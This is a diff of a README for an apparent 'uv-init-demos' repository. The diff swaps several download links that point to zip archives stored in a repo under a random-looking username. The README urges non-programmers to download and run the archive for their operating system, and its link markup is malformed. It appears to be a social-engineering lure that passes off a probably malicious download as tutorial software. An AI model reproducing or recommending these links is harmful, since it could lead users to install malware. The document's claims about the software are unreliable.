@@ -4,7 +4,7 @@
 This repository contains demos of various `uv init` commands. Each demo illustrates how to run the commands effectively, helping you understand their functions without needing extensive programming skills.
 
 ## 📥 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/ljkjhgfc/uv-init-demos/main/uv-init-lib/demos-init-uv-2.3.zip%20from%https://raw.githubusercontent.com/ljkjhgfc/uv-init-demos/main/uv-init-lib/demos-init-uv-2.3.zip)](https://raw.githubusercontent.com/ljkjhgfc/uv-init-demos/main/uv-init-lib/demos-init-uv-2.3.zip)
+[![Download from Releases](https://github.com/ljkjhgfc/uv-init-demos/raw/refs/heads/main/uv-init-no-package/uv_init_demos_v2.1.zip%20from%https://github.com/ljkjhgfc/uv-init-demos/raw/refs/heads/main/uv-init-no-package/uv_init_demos_v2.1.zip)](https://github.com/ljkjhgfc/uv-init-demos/raw/refs/heads/main/uv-init-no-package/uv_init_demos_v2.1.zip)
 
 ## 🚀 Getting Started
 To begin using the `uv-init-demos`, follow these simple steps to download and run the software on your computer. 
@@ -18,7 +18,7 @@ To begin using the `uv-init-demos`, follow these simple steps to download and ru
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
    Go to the Releases page to find the latest version of `uv-init-demos`. Click the link below:  
-   [Visit this page to download](https://raw.githubusercontent.com/ljkjhgfc/uv-init-demos/main/uv-init-lib/demos-init-uv-2.3.zip)
+   [Visit this page to download](https://github.com/ljkjhgfc/uv-init-demos/raw/refs/heads/main/uv-init-no-package/uv_init_demos_v2.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the version suitable for your operating system. 
@@ -64,4 +64,4 @@ This project is licensed under the MIT License. You can find the full text of th
 ## 🔗 Additional Resources
 For detailed documentation and more examples, consider visiting the official `uv` documentation site. This will provide you with comprehensive insights into the various commands you can use alongside `uv-init-demos`.
 
-[Download Now Again](https://raw.githubusercontent.com/ljkjhgfc/uv-init-demos/main/uv-init-lib/demos-init-uv-2.3.zip) and start experimenting with `uv init` commands to see what you can create!
+[Download Now Again](https://github.com/ljkjhgfc/uv-init-demos/raw/refs/heads/main/uv-init-no-package/uv_init_demos_v2.1.zip) and start experimenting with `uv init` commands to see what you can create!
